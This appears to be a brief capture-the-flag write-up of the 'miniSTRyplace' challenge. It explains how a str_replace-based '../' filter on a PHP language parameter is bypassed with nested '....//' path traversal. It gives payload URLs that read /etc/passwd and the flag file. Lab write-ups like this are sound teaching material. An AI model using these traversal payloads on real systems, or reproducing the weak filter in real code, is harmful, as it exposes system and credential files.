<ul>
<li>hint1: “Let's read this website in the language of Alines. Or maybe not?
This challenge will raise 33 euros for a good cause.”</li>
<li>hint2: The challenges name is “miniSTRyplace”. This is a play on words for str_replace.</li>
<li><p>We see right away that we can change language and it is represented:
<code>ip.address/?lang=es.php</code> a perfect place to try LFI</p></li>
<li><p>In order to prevent path traversal, developers can implement blacklisting. It will usually look something like this:</p></li>
</ul>

<p><code>
$language = str_replace('../', '', $_GET['language']);
</code></p>

<ul>
<li>This is where you can see the name of the challenge was a hint to the sec measures used.
*now we can modify our final payload to bypass blacklisting:</li>
</ul>

<p><code>
http://46.101.77.180:32490/?lang=....//....//....//....//....//....//....//....//etc/passwd
</code></p>

<ul>
<li>Our exploit is successful, to get the flag we just used the following :</li>
</ul>

<p><code>
http://165.227.234.7:30779/?lang=....//....//flag
</code></p>
